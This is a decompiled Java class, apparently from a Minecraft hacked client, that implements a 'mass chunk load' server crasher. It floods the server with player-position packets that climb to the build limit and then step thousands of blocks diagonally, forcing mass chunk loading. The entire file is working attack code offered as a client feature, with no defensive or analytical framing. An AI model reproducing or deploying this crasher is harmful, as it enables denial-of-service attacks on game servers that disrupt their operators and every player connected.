// 
// Decompiled by Procyon v0.6.0
// 

package me.amkgre.bettercraft.client.mods.crasher.mclc;

import net.minecraft.network.Packet;
import net.minecraft.network.play.client.CPacketPlayer;
import net.minecraft.client.Minecraft;

public class MassChunkLoadCrasher2
{
    public static void start() {
        for (double yPos = Minecraft.getMinecraft().player.posY; yPos < 255.0; yPos += 5.0) {
            Minecraft.getMinecraft().player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.getMinecraft().player.posX, yPos, Minecraft.getMinecraft().player.posZ, true));
        }
        for (int i = 0; i < 6685; i += 5) {
            Minecraft.getMinecraft().player.connection.sendPacket(new CPacketPlayer.Position(Minecraft.getMinecraft().player.posX + i, 255.0, Minecraft.getMinecraft().player.posZ + i, true));
        }
    }
}
